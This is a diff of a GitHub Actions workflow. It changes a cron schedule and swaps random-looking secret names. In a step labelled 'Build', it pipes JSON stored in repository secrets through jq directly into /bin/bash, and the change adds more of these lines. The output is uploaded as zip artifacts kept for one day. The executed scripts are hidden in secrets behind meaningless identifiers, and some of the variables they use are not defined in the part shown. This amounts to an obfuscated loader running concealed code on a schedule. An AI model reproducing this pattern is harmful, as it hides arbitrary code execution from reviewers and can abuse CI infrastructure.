@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '11 3,9,15,21 * * *'
+    - cron: '25 3,9,15,21 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,14 +16,16 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          mrzww868: ${{ secrets.mrzww868 }}
+          o43149: ${{ secrets.o43149 }}
         run: |
-          printf '%s' "$mrzww868" | jq -r .vh66 | /bin/bash
-          printf '%s' "$magf26036" | jq -r .c82091 | /bin/bash
+          printf '%s' "$o43149" | jq -r .y6203 | /bin/bash
+          printf '%s' "$mkh957" | jq -r .aviz3 | /bin/bash
+          printf '%s' "$g06123" | jq -r .k7340 | /bin/bash
+          echo $ci9 | jq -r .jhv69981 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: ZDpefY3J
+          name: mKLRrk7w
           path: "*.zip"
           retention-days: 1
